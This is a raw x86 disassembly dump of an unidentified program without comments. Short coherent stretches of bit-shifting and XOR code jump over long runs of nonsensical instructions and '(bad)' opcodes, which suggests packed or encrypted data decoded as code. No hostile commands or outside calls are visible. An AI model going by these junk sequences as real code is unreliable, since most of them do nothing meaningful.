  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x4114ba29],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	leave  
  406557:	lods   eax,DWORD PTR ds:[esi]
  406558:	arpl   ax,di
  40655a:	mov    bh,0xa8
  40655c:	mov    al,ds:0x803a9022
  406561:	cmp    BYTE PTR [edx],cl
  406563:	and    eax,DWORD PTR [ecx-0x2635ceb6]
  406569:	popa   
  40656a:	into   
  40656b:	pop    ebx
  40656c:	mov    esp,0x544a6db3
  406571:	adc    eax,0xce5e0517
  406576:	adc    al,0x20
  406578:	add    al,0x6f
  40657a:	jae    0x406505
  40657c:	test   DWORD PTR [ecx-0x33d6a185],ecx
  406582:	pop    ss
  406583:	adc    esp,DWORD PTR [esi+0x37]
  406586:	ror    edx,1
  406588:	cvtps2pd xmm3,QWORD PTR [esi+0x63]
  40658c:	xor    ch,al
  40658e:	and    ebx,eax
  406590:	ja     0x40652e
  406592:	xor    al,bh
  406594:	push   0xffffffe7
  406596:	pop    edi
  406597:	hlt    
  406598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406599:	mov    esi,0x5d9e26b0
  40659e:	push   ebp
  40659f:	stos   DWORD PTR es:[edi],eax
  4065a0:	jl     0x406555
  4065a2:	push   ecx
  4065a3:	stc    
  4065a4:	dec    DWORD PTR [eax+0x9279aa2]
  4065aa:	mov    ecx,0x7933be8
  4065af:	xchg   BYTE PTR [edi],dh
  4065b1:	ret    
  4065b2:	or     al,0xc9
  4065b4:	jb     0x406597
  4065b6:	pop    DWORD PTR [edx]
  4065b8:	inc    ebp
  4065b9:	or     BYTE PTR [ecx],0x76
  4065bc:	lea    eax,[eax+eiz*1]
  4065bf:	mov    eax,DWORD PTR [eax+0x59]
  4065c2:	jae    0x40660c
  4065c4:	add    eax,DWORD PTR [edi+0x5]
  4065c7:	fs mov ah,0xfa
  4065ca:	and    ecx,esi
  4065cc:	or     edx,DWORD PTR [edx]
  4065ce:	xor    dh,cl
  4065d0:	and    ebx,edi
  4065d2:	ins    DWORD PTR es:[edi],dx
  4065d3:	cmc    
  4065d4:	push   cs
  4065d5:	mov    cl,0x90
  4065d7:	popf   
  4065d8:	in     al,dx
  4065d9:	test   DWORD PTR [edi-0x44],eax
  4065dc:	stos   DWORD PTR es:[edi],eax
  4065dd:	and    ch,BYTE PTR [ebp+0x5b5fe180]
  4065e3:	and    DWORD PTR [eax],esp
  4065e5:	mov    eax,0x5fe76ccb
  4065ea:	xlat   BYTE PTR ds:[ebx]
  4065eb:	stos   DWORD PTR es:[edi],eax
  4065ec:	lahf   
  4065ed:	ins    DWORD PTR es:[edi],dx
  4065ee:	daa    
  4065ef:	add    ch,cl
  4065f1:	push   0x72379c9c
  4065f6:	mov    BYTE PTR [ecx+eax*1+0x4a71a5ac],bh
  4065fd:	hlt    
  4065fe:	xchg   BYTE PTR [eax],bl
  406600:	xchg   BYTE PTR [edi+0x2adf8567],bh
  406606:	ficomp WORD PTR [ebx-0xc637e70]
  40660c:	sub    DWORD PTR [ebp+0x6d],esp
  40660f:	(bad)  
  406610:	push   esi
  406611:	sub    DWORD PTR [edx+0x7ba3626],0x55
  406618:	aam    0x8
  40661a:	push   eax
  40661b:	test   eax,0xb40143b
  406620:	sbb    al,0x1
  406622:	sub    al,0xe8
  406624:	xlat   BYTE PTR ds:[ebx]
  406625:	adc    al,0xd1
  406627:	xor    BYTE PTR [edx+0x5206c3fb],al
  40662d:	jmp    0x885:0xe0f03289
  406634:	or     cl,ch
  406636:	loope  0x406625
  406638:	icebp  
  406639:	pop    es
  40663a:	cs in  eax,dx
  40663c:	sti    
  40663d:	add    edi,DWORD PTR [esi-0x4c]
  406640:	test   eax,0x8ec4b88d
  406645:	lods   al,BYTE PTR ds:[esi]
  406646:	lds    edx,FWORD PTR ss:[eax]
  406649:	iret   
  40664a:	inc    eax
  40664b:	retf   0x8a40
  40664e:	hlt    
  40664f:	lods   eax,DWORD PTR ds:[esi]
  406650:	pop    ecx
  406651:	jb     0x40666c
  406653:	in     eax,0xb6
  406655:	or     esp,DWORD PTR [edi+0x43]
  406658:	mov    cl,0xb0
  40665a:	stos   DWORD PTR es:[edi],eax
  40665b:	dec    eax
  40665c:	push   edi
  40665d:	(bad)  
  40665e:	push   0x2203ce2c
  406663:	pop    ebx
  406664:	push   es
  406665:	repnz data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406668:	pop    ebp
  406669:	mov    al,ds:0xe4252e3c
  40666e:	adc    BYTE PTR [edi+0x74],bl
  406671:	gs (bad) 
  406673:	xor    al,0xd0
  406675:	(bad)  
  406676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406677:	pushf  
  406678:	int    0x87
  40667a:	jb     0x4066e4
  40667c:	icebp  
  40667d:	imul   edi,esi,0xffffffd3
  406680:	sub    eax,0x52f4b187
  406685:	call   DWORD PTR [ebx+0x7d194d0f]
  40668b:	hlt    
  40668c:	(bad)  
  40668d:	mul    BYTE PTR [edx+0x7624ee96]
  406693:	mov    eax,edx
  406695:	push   ecx
  406696:	sbb    esp,esp
  406698:	out    dx,al
  406699:	jp     0x406640
  40669b:	adc    eax,0x39873cb6
  4066a0:	nop
  4066a1:	mov    edx,0x78a6ec13
  4066a6:	mov    ds:0xab919762,al
  4066ab:	inc    esi
  4066ac:	dec    ecx
  4066ad:	retf   
  4066ae:	or     bl,BYTE PTR [ebx+0x71]
  4066b1:	scas   al,BYTE PTR es:[edi]
  4066b2:	cmp    ah,BYTE PTR [ecx+0x7d]
  4066b5:	mov    ch,0x2c
  4066b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b8:	cld    
  4066b9:	jbe    0x4066ea
  4066bb:	xor    edi,DWORD PTR [esp+ebp*2+0x7f]
  4066bf:	push   esi
  4066c0:	jge    0x4066bf
  4066c2:	fwait
  4066c3:	jno    0x4066d4
  4066c5:	mov    ds:0x65ed7e58,al
  4066ca:	scas   eax,DWORD PTR es:[edi]
  4066cb:	or     esp,DWORD PTR [esi+0x28]
  4066ce:	jl     0x40670b
  4066d0:	add    al,0x4
  4066d2:	fisubr DWORD PTR [ecx+0x353e9c8e]
  4066d8:	pop    ss
  4066d9:	cmp    DWORD PTR [eax],esi
  4066db:	push   ss
  4066dc:	aam    0xc3
  4066de:	adc    eax,DWORD PTR [edx-0x2f]
  4066e1:	push   ebx
  4066e2:	push   eax
  4066e3:	adc    DWORD PTR [esi-0x7a32ee8],ebx
  4066e9:	jle    0x40672b
  4066eb:	out    0x7f,al
  4066ed:	mov    ebx,0x872fc648
  4066f2:	sub    eax,0x65402f64
  4066f7:	ins    DWORD PTR es:[edi],dx
  4066f8:	mov    al,0xe2
  4066fa:	cmp    DWORD PTR [ebx],0xffffff8d
  4066fd:	dec    eax
  4066fe:	loopne 0x4066bb
  406700:	ret    
  406701:	mov    ah,0x4b
  406703:	sub    ebx,DWORD PTR [esi]
  406705:	xor    BYTE PTR ss:[ebp+0x4e6c40e1],bh
  40670c:	stc    
  40670d:	mov    bh,0x5f
  40670f:	add    eax,0xb9689379
  406714:	inc    edx
  406715:	repnz fimul DWORD PTR [esi+0x1a3b73f4]
  40671c:	dec    ecx
  40671d:	or     dl,dl
  40671f:	out    0xec,eax
  406721:	cmp    esp,DWORD PTR [ebp+0x374a9476]
  406727:	mov    fs:0x16cf6bb9,eax
  40672d:	adc    ah,BYTE PTR [ecx]
  40672f:	iret   
  406730:	jnp    0x406751
  406732:	pop    ds
  406733:	loope  0x4067ac
  406735:	push   0xffffff9e
  406737:	mov    eax,ds:0xeecd1468
  40673c:	cmp    eax,0xe1c209a8
  406741:	add    ecx,DWORD PTR [ebx-0xd78878c]
  406747:	xchg   edx,eax
  406748:	inc    eax
  406749:	push   ds
  40674a:	fnstenv gs:[edi+edi*8-0x6e]
  40674f:	in     al,dx
  406750:	(bad)  
  406751:	push   0x3f13d9ae
  406756:	inc    DWORD PTR [edi-0x663e6d3a]
  40675c:	adc    al,0x49
  40675e:	mov    eax,ds:0x60e7b3bb
  406763:	mov    bh,0xc9
  406765:	adc    dh,BYTE PTR [ecx-0x7e51c1bd]
  40676b:	fs sbb ah,ah
  40676e:	(bad)  
  40676f:	mov    ebp,0xc093fe4e
  406774:	ret    0x55c9
  406777:	lock aam 0x3e
  40677a:	mov    cl,cl
  40677c:	shl    BYTE PTR [edx-0x39849cef],1
  406782:	pushf  
  406783:	ins    BYTE PTR es:[edi],dx
  406784:	sbb    ah,BYTE PTR [ebx-0x5ba4418b]
  40678a:	sub    eax,0x862f33ec
  40678f:	mov    eax,0xd0710834
  406794:	stos   BYTE PTR es:[edi],al
  406795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406796:	jge    0x4067a2
  406798:	test   DWORD PTR [ebx+esi*8+0x7f],eax
  40679c:	jbe    0x406745
  40679e:	or     cl,BYTE PTR [ebx+eiz*8-0x1a]
  4067a2:	mov    WORD PTR [esi+0x49988f28],ss
  4067a8:	pop    ds
  4067a9:	mov    dl,0x76
  4067ab:	and    DWORD PTR [edi+ecx*8+0x586792ca],eax
  4067b2:	(bad)  
  4067b3:	push   ebx
  4067b4:	cwde   
  4067b5:	sbb    al,BYTE PTR [ebx+0x7]
  4067b8:	xchg   ebx,eax
  4067b9:	inc    esp
  4067ba:	cmp    al,0xac
  4067bc:	repnz push ebp
  4067be:	dec    edx
  4067bf:	out    dx,al
  4067c0:	push   ds
  4067c1:	je     0x4067d7
  4067c3:	arpl   WORD PTR [eax-0x63],ax
  4067c6:	mov    ecx,eax
  4067c8:	mov    dh,0x49
  4067ca:	push   eax
  4067cb:	pop    ecx
  4067cc:	jl     0x406812
  4067ce:	push   edi
  4067cf:	xchg   ecx,eax
  4067d0:	mov    ebp,0x9edae868
  4067d5:	loop   0x4067ba
  4067d7:	dec    ecx
  4067d8:	mov    ds:0xf1874bc3,al
  4067dd:	lahf   
  4067de:	push   ebx
  4067df:	mov    ah,0x28
  4067e1:	ins    DWORD PTR es:[edi],dx
  4067e2:	push   esi
  4067e3:	scas   eax,DWORD PTR es:[edi]
  4067e4:	ror    DWORD PTR [ecx+0x5c],1
  4067e7:	int    0x31
  4067e9:	jno    0x406821
  4067eb:	xor    esp,DWORD PTR [ebp+0x4f]
  4067ee:	cmp    al,0xe3
  4067f0:	sbb    edx,DWORD PTR [edx+0x45]
  4067f3:	je     0x406833
  4067f5:	das    
  4067f6:	inc    ebx
  4067f7:	lods   al,BYTE PTR ds:[esi]
  4067f8:	pop    esi
  4067f9:	das    
  4067fa:	ja     0x4067b2
  4067fc:	xchg   edx,eax
  4067fd:	mov    dl,0x27
  4067ff:	clc    
  406800:	xchg   esp,eax
  406801:	xchg   ch,ch
  406803:	pop    ds
  406804:	xchg   ebx,eax
  406805:	fwait
  406806:	dec    ecx
  406807:	daa    
  406808:	add    bh,BYTE PTR ds:0x213a8894
  40680e:	cmp    ch,BYTE PTR [esi+0x2d]
  406811:	xor    BYTE PTR [ebx+ebx*4-0xbede334],cl
  406818:	xor    ebx,DWORD PTR [eax]
  40681a:	icebp  
  40681b:	enter  0x2e92,0xc8
  40681f:	cwde   
  406820:	pop    edi
  406821:	pop    es
  406822:	les    esp,FWORD PTR [ecx]
  406824:	sar    cl,1
  406826:	loope  0x40682e
  406828:	fs push edx
  40682a:	inc    esi
  40682b:	rol    DWORD PTR [ebp-0x79e77c05],1
  406831:	push   esi
  406832:	gs lock push cs
  406835:	std    
  406836:	sub    BYTE PTR [edx+esi*1-0x680acea2],ch
  40683d:	push   ds
  40683e:	fcomp  DWORD PTR [ebx+0x66]
  406841:	adc    DWORD PTR [edx],ebx
  406843:	inc    edx
  406844:	(bad)  
  406845:	sbb    ebx,edx
  406847:	add    ah,BYTE PTR [ecx+0x1eab8729]
  40684d:	mov    eax,0x2cde216d
  406852:	xchg   edx,eax
  406853:	lods   eax,DWORD PTR ds:[esi]
  406854:	scas   al,BYTE PTR es:[edi]
  406855:	aad    0xba
  406857:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406859:	stos   BYTE PTR es:[edi],al
  40685a:	into   
  40685b:	cmc    
  40685c:	dec    ecx
  40685d:	fisttp QWORD PTR [ebx+eax*1]
  406860:	imul   ebp,ecx,0xc971bb9
  406866:	adc    al,0xb1
  406868:	imul   eax,DWORD PTR [ecx+esi*8-0x1f62e899],0xab79f0f0
  406873:	shl    DWORD PTR [esp+eiz*4],0xa6
  406877:	add    eax,0x4308ab24
  40687c:	push   ds
  40687d:	fdivrp st(6),st
  40687f:	rcr    ebp,1
  406881:	pushf  
  406882:	and    cl,bl
  406884:	mov    DWORD PTR [eax],0x8788c58f
  40688a:	inc    ecx
  40688b:	in     al,0x58
  40688d:	lds    esi,FWORD PTR [esi+eax*4+0x33]
  406891:	pop    esp
  406892:	mov    esi,0x34fb89a2
  406897:	(bad)  
  406898:	push   cs
  406899:	and    al,dh
  40689b:	push   0x621170aa
  4068a0:	call   0x4d8dc604
  4068a5:	jae    0x406878
  4068a7:	dec    esp
  4068a8:	sub    eax,0xc2f48c5d
  4068ad:	cmp    al,0xc9
  4068af:	dec    esi
  4068b0:	push   0x95ac7507
  4068b5:	in     eax,dx
  4068b6:	jmp    0x8f83:0xa2dbbb04
  4068bd:	aad    0xe
  4068bf:	addr16 call 0xe0746553
  4068c5:	(bad)  
  4068c6:	pop    edi
  4068c7:	xchg   ebp,eax
  4068c8:	xchg   DWORD PTR [esi+0xf],edx
  4068cb:	aaa    
  4068cc:	pop    eax
  4068cd:	sahf   
  4068ce:	aas    
  4068cf:	pushf  
  4068d0:	clc    
  4068d1:	sti    
  4068d2:	neg    DWORD PTR [ecx-0x45]
  4068d5:	mov    ch,0x28
  4068d7:	xchg   ebp,eax
  4068d8:	int    0x1a
  4068da:	clc    
  4068db:	add    edx,DWORD PTR [esp+eiz*4]
  4068de:	loopne 0x4068af
  4068e0:	dec    edx
  4068e1:	and    BYTE PTR [esi+0x2c543a72],0x3c
  4068e8:	mov    eax,ds:0xda2ecdc5
  4068ed:	mul    DWORD PTR [ebp-0x71]
  4068f0:	push   ebx
  4068f1:	dec    esi
  4068f2:	mov    esi,0xde72dcf4
  4068f7:	mov    bh,0xa8
  4068f9:	ret    0xd835
  4068fc:	inc    esp
  4068fd:	add    al,0x44
  4068ff:	(bad)  
  406900:	pop    ds
  406901:	pusha  
  406902:	mov    dh,0x44
  406904:	fistp  DWORD PTR [eax+ebp*2+0x44407852]
  40690b:	lods   al,BYTE PTR ds:[esi]
  40690c:	popf   
  40690d:	pop    ss
  40690e:	sbb    DWORD PTR [ebp+edi*8+0x4d],edi
  406912:	ret    0x209f
  406915:	xchg   ecx,eax
  406916:	ds shl ecx,0x1e
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xbe2b5941
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	loope  0x40695d
  406982:	(bad)  
  406983:	mul    BYTE PTR [ebx]
  406985:	adc    eax,0x4d5b862f
  40698a:	xor    ch,BYTE PTR [esi-0x33]
  40698d:	rol    esi,1
  40698f:	cli    
  406990:	jbe    0x40697d
  406992:	jno    0x4069fe
  406994:	(bad)  
  406995:	ret    
  406996:	retf   
  406997:	dec    edi
  406998:	sbb    DWORD PTR [esi+0x1fff73ad],esp
  40699e:	test   eax,0xb1ce3e2c
  4069a3:	push   edi
  4069a4:	ret    
  4069a5:	mov    bh,0xb9
  4069a7:	into   
  4069a8:	jle    0x4069c4
  4069aa:	into   
  4069ab:	je     0x406a19
  4069ad:	pushf  
  4069ae:	pop    ss
  4069af:	ret    
  4069b0:	push   0x3a
  4069b2:	mov    WORD PTR [esp+ebp*2-0x79dbaa1d],es
  4069b9:	pushf  
  4069ba:	push   cs
  4069bb:	xchg   esi,eax
  4069bc:	jmp    0xd21c7136
  4069c1:	add    edi,DWORD PTR [ebp+esi*2-0x72]
  4069c5:	pop    esi
  4069c6:	jp     0x406994
  4069c8:	mov    WORD PTR [ebx+0x1acb7f52],?
  4069ce:	pop    eax
  4069cf:	jno    0x406976
  4069d1:	sbb    al,0xd9
  4069d3:	sub    ebp,esi
  4069d5:	dec    edx
  4069d6:	ja     0x4069db
  4069d8:	push   cs
  4069d9:	clc    
  4069da:	sbb    DWORD PTR [eax+0x1],edx
  4069dd:	sbb    al,0xd6
  4069df:	out    0xce,al
  4069e1:	test   DWORD PTR [edi],esp
  4069e3:	sub    al,0x3a
  4069e5:	out    dx,eax
  4069e6:	stos   BYTE PTR es:[edi],al
  4069e7:	sar    BYTE PTR [esi],0xc4
  4069ea:	jbe    0x406a3e
  4069ec:	(bad)  [ebx]
  4069ee:	mov    edi,DWORD PTR [edi-0x7f43219d]
  4069f4:	or     esp,edi
  4069f6:	dec    ecx
  4069f7:	pop    es
  4069f8:	popf   
  4069f9:	adc    DWORD PTR [esi],0x4d5bb203
  4069ff:	enter  0x9b28,0xaf
  406a03:	leave  
  406a04:	dec    ebx
  406a05:	daa    
  406a06:	mov    bl,BYTE PTR [eax]
  406a08:	mov    bl,0x16
  406a0a:	mov    ah,0xd
  406a0c:	mov    esi,0xa0d1a573
  406a11:	arpl   WORD PTR [ebx],sp
  406a13:	cmc    
  406a14:	jmp    0x256d:0x645a11d
  406a1b:	sar    BYTE PTR [edi],0xdf
  406a1e:	push   ebp
  406a1f:	fbstp  TBYTE PTR [ebp+0x55]
  406a22:	mov    ebx,0xd8560d6b
  406a27:	add    eax,0x316a2973
  406a2c:	es test eax,0xe1b4c5ff
  406a32:	cmp    al,0x47
  406a34:	xchg   edi,eax
  406a35:	mov    WORD PTR [eax-0x27fed7ed],cs
  406a3b:	sbb    DWORD PTR [edx+0x18d9a9ae],eax
  406a41:	data16 das 
  406a43:	add    al,0x87
  406a45:	fist   DWORD PTR [eax+0x1f28be21]
  406a4b:	adc    al,0x9a
  406a4d:	xlat   BYTE PTR ds:[ebx]
  406a4e:	mov    ebx,0xa31865b7
  406a53:	jb     0x406a08
  406a55:	idiv   BYTE PTR [edi-0x1ac1315e]
  406a5b:	iret   
  406a5c:	into   
  406a5d:	dec    ebx
  406a5e:	jge    0x4069eb
  406a60:	out    dx,al
  406a61:	and    eax,DWORD PTR [edi+0x1e]
  406a64:	jbe    0x406a9a
  406a66:	jecxz  0x4069ed
  406a68:	xchg   esi,eax
  406a69:	jmp    0x406ad3
  406a6b:	dec    ebx
  406a6c:	push   edi
  406a6d:	rcl    DWORD PTR [edi],0x17
  406a70:	jle    0x406a2e
  406a72:	mov    ah,0x7
  406a74:	xchg   ecx,eax
  406a75:	dec    ebp
  406a76:	shr    DWORD PTR [ebp+0x180184b6],1
  406a7c:	inc    ecx
  406a7d:	push   edi
  406a7e:	call   0xea03a6ec
  406a83:	iret   
  406a84:	mov    WORD PTR [ebx],ds
  406a86:	retf   0xcde9
  406a89:	jnp    0x406a17
  406a8b:	mov    esi,ds
  406a8d:	out    0x21,al
  406a8f:	mov    ecx,0x1dd9875d
  406a94:	mul    ecx
  406a96:	mov    esp,0x8d603a74
  406a9b:	mov    eax,ds:0x97b2b17b
  406aa0:	sahf   
  406aa1:	icebp  
  406aa2:	loopne 0x406b08
  406aa4:	enter  0xcdd9,0x46
  406aa8:	sbb    ah,BYTE PTR [esi]
  406aaa:	aaa    
  406aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aac:	retf   
  406aad:	rcl    DWORD PTR [edi+0x3d2539e9],1
  406ab3:	and    al,0xb0
  406ab5:	ficomp DWORD PTR [ecx]
  406ab7:	adc    BYTE PTR [ebx-0x17],0x7b
  406abb:	(bad)  
  406abc:	jecxz  0x406a64
  406abe:	and    al,0xa4
  406ac0:	scas   al,BYTE PTR es:[edi]
  406ac1:	sub    bh,BYTE PTR [ecx]
  406ac3:	jge    0x406a46
  406ac5:	mov    dl,0x16
  406ac7:	into   
  406ac8:	xchg   edx,eax
  406ac9:	es popf 
  406acb:	(bad)  
  406acc:	mov    ch,0x92
  406ace:	lahf   
  406acf:	(bad)  
  406ad0:	fwait
  406ad1:	pop    edi
  406ad2:	jb     0x406aad
  406ad4:	gs ins BYTE PTR es:[edi],dx
  406ad6:	lds    edx,FWORD PTR [ebp+0x20]
  406ad9:	repz dec edx
  406adb:	mov    ds:0x65294631,al
  406ae0:	iret   
  406ae1:	fwait
  406ae2:	scas   eax,DWORD PTR es:[edi]
  406ae3:	push   ss
  406ae4:	dec    edi
  406ae5:	ja     0x406b54
  406ae7:	jnp    0x406aa3
  406ae9:	jecxz  0x406afa
  406aeb:	adc    cl,cl
  406aed:	pop    eax
  406aee:	sub    dl,BYTE PTR [eax+eax*8]
  406af1:	mov    cl,BYTE PTR [eax]
  406af3:	mov    bl,0x47
  406af5:	test   al,0x7e
  406af7:	dec    eax
  406af8:	stos   BYTE PTR es:[edi],al
  406af9:	std    
  406afa:	inc    eax
  406afb:	sub    eax,0x84a8e40
  406b00:	push   0x36
  406b02:	inc    edx
  406b03:	loopne 0x406b3a
  406b05:	or     bl,BYTE PTR [ebx+eax*1]
  406b08:	mov    ds:0xf45a95d6,al
  406b0d:	mov    edx,0xff1c1dec
  406b12:	jp     0x406b5a
  406b14:	out    0xc1,eax
  406b16:	xchg   ebp,eax
  406b17:	fwait
  406b18:	je     0x406aee
  406b1a:	cli    
  406b1b:	mov    ds:0xdade2cb3,eax
  406b20:	rcl    ch,cl
  406b22:	in     eax,dx
  406b23:	cli    
  406b24:	in     eax,0xaf
  406b26:	cld    
  406b27:	pop    ss
  406b28:	inc    esp
  406b29:	stc    
  406b2a:	pop    ss
  406b2b:	mov    edi,0x4d031983
  406b30:	push   edi
  406b31:	cmp    eax,DWORD PTR [esi+0x36591082]
  406b37:	jnp    0x406ae9
  406b39:	push   ss
  406b3a:	sbb    al,0xe
  406b3c:	fisttp QWORD PTR [edi-0x7d860f95]
  406b42:	jbe    0x406b36
  406b44:	mov    eax,ds:0x64b917a
  406b49:	lock jns 0x406b83
  406b4c:	inc    esi
  406b4d:	ins    BYTE PTR es:[edi],dx
  406b4e:	in     eax,0xca
  406b50:	sahf   
  406b51:	pop    ecx
  406b52:	and    eax,0x2812ce31
  406b57:	jne    0x406ae4
  406b59:	xchg   esi,eax
  406b5a:	xor    cl,BYTE PTR ds:0xd3075d2a
  406b60:	pop    ds
  406b61:	jno    0x406b4b
  406b63:	leave  
  406b64:	(bad)  
  406b65:	adc    al,BYTE PTR [eax+0x3781fbca]
  406b6b:	sar    bh,0x1
  406b6e:	clc    
  406b6f:	cmp    BYTE PTR [edx],dh
  406b71:	mov    cl,0x91
  406b73:	(bad)  [edx]
  406b75:	jb     0x406b22
  406b77:	xchg   ebp,eax
  406b78:	pop    ds
  406b79:	call   0xaea5:0x2ecc9a32
  406b80:	enter  0x7a5e,0xc1
  406b84:	mov    ebx,0xb97923d
  406b89:	test   DWORD PTR [eax+0x50],0xdbb6b667
  406b90:	mov    ss,WORD PTR [edi+0x48]
  406b93:	fcom   DWORD PTR [edx+edi*8-0x43]
  406b97:	pop    es
  406b98:	or     eax,0xe51c8827
  406b9d:	into   
  406b9e:	in     al,dx
  406b9f:	sbb    bl,ch
  406ba1:	pop    esp
  406ba2:	and    al,0xb4
  406ba4:	ins    BYTE PTR es:[edi],dx
  406ba5:	icebp  
  406ba6:	cwde   
  406ba7:	xchg   esi,eax
  406ba8:	inc    edi
  406ba9:	mov    dh,0x2
  406bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bac:	jb     0x406b98
  406bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406baf:	sub    al,0xee
  406bb1:	(bad)  
  406bb2:	cdq    
  406bb3:	xchg   edx,eax
  406bb4:	dec    edi
  406bb5:	leave  
  406bb6:	sahf   
  406bb7:	sbb    ebx,esp
  406bb9:	adc    BYTE PTR [edx-0x10b6c0f8],ch
  406bbf:	std    
  406bc0:	cmp    BYTE PTR [ecx+eiz*2-0x432359ed],dh
  406bc7:	std    
  406bc8:	cwde   
  406bc9:	cmp    BYTE PTR fs:[ecx-0x11c733ce],0xd3
  406bd1:	mov    eax,ds:0xeb0194a2
  406bd6:	cli    
  406bd7:	cli    
  406bd8:	shl    WORD PTR [eax+ebx*8],cl
  406bdc:	pop    ebp
  406bdd:	out    dx,al
  406bde:	or     eax,0xffbd8665
  406be3:	cwde   
  406be4:	out    dx,eax
  406be5:	cmc    
  406be6:	jbe    0x406bc9
  406be8:	cli    
  406be9:	adc    DWORD PTR [esi+0x71],ebp
  406bec:	jb     0x406ba4
  406bee:	das    
  406bef:	mov    ah,0xb2
  406bf1:	imul   ebp,DWORD PTR [edx+0x7b3fd113],0xe9a34eba
  406bfb:	iret   
  406bfc:	inc    ebp
  406bfd:	aam    0xc9
  406bff:	dec    eax
  406c00:	xchg   ebp,ecx
  406c02:	xlat   BYTE PTR ds:[ebx]
  406c03:	sbb    esp,DWORD PTR [edx-0x22df8465]
  406c09:	jle    0x406bd9
  406c0b:	out    dx,al
  406c0c:	inc    esp
  406c0d:	mov    ds:0x4cb3b351,al
  406c12:	xchg   BYTE PTR [ebp-0x5f],cl
  406c15:	pop    esi
  406c16:	or     DWORD PTR [esi-0x67],edi
  406c19:	jecxz  0x406ba1
  406c1b:	ret    0xb2c8
  406c1e:	pusha  
  406c1f:	xor    DWORD PTR [edx+0x74],esp
  406c22:	scas   eax,DWORD PTR es:[edi]
  406c23:	mov    cl,BYTE PTR [edx-0x61825da3]
  406c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c2a:	je     0x406bf0
  406c2c:	es (bad) 
  406c2f:	lock xchg ecx,eax
  406c31:	xchg   DWORD PTR [eax],ebp
  406c33:	add    al,0x4f
  406c35:	hlt    
  406c36:	pop    edi
  406c37:	cmc    
  406c38:	pop    eax
  406c39:	das    
  406c3a:	sub    BYTE PTR [eax+0x2933fcca],0xbf
  406c41:	mov    esi,0xb7176df8
  406c46:	pop    eax
  406c47:	add    dh,al
  406c49:	leave  
  406c4a:	stos   BYTE PTR es:[edi],al
  406c4b:	and    al,0x17
  406c4d:	push   ss
  406c4e:	iret   
  406c4f:	aaa    
  406c50:	dec    eax
  406c51:	out    0x97,al
  406c53:	(bad)  
  406c54:	mov    ecx,0x12539f01
  406c59:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c5b:	xor    DWORD PTR [ecx-0x4fdfe197],esi
  406c61:	imul   BYTE PTR [eax-0x66]
  406c64:	scas   al,BYTE PTR es:[edi]
  406c65:	test   BYTE PTR [edx+ecx*1+0x460b9c11],dl
  406c6c:	out    0x5a,al
  406c6e:	xor    BYTE PTR [edx+0xc7a6a53],dh
  406c74:	mov    edx,0x2315229e
  406c79:	inc    edx
  406c7a:	(bad)  
  406c7b:	sub    DWORD PTR [ebx-0x3904d594],eax
  406c81:	inc    eax
  406c82:	cmp    eax,0xa99b0d16
  406c87:	sub    bl,BYTE PTR [ecx-0x34]
  406c8a:	inc    esi
  406c8b:	or     al,al
  406c8d:	xchg   esi,eax
  406c8e:	push   eax
  406c8f:	sbb    BYTE PTR [ecx+edi*4],bl
  406c92:	dec    edi
  406c93:	push   ebx
  406c94:	push   es
  406c95:	call   0x4a1e:0x3a00915a
  406c9c:	cld    
  406c9d:	bound  esp,QWORD PTR [esi]
  406c9f:	mov    al,bl
  406ca1:	cmp    al,0xec
  406ca3:	sbb    BYTE PTR [edi-0x7e],cl
  406ca6:	dec    esp
  406ca7:	fabs   
  406ca9:	dec    eax
  406caa:	sub    BYTE PTR [eax-0x7],dh
  406cad:	mov    dl,0x72
  406caf:	inc    DWORD PTR [ecx+0x18e4bb0c]
  406cb5:	dec    ecx
  406cb6:	mov    ebx,edi
